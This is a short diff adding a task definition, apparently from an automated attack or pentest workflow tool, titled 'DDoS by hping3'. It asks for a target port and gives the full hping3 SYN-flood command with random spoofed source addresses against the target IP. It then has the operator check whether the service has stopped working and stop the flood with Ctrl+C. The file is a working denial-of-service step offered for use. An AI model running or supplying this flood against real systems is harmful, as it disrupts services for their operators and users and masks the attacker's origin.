@@ -1,0 +1,11 @@
+description: DDoS by hping3
+function: magic_function
+argument: []
+In: [IP]
+condition: 
+Out: []
+hint: 
+  - "[INPUT]port_to_flood"
+  - "open another terminal, enter `sudo hping3 {Data['IP']} -q -n -S -p {Data['port_to_flood']} --flood --rand-source`"
+  - "check if the sevice is unable to work well after above attack(y/N)"
+  - "stop attacking by entering ctrl+C"
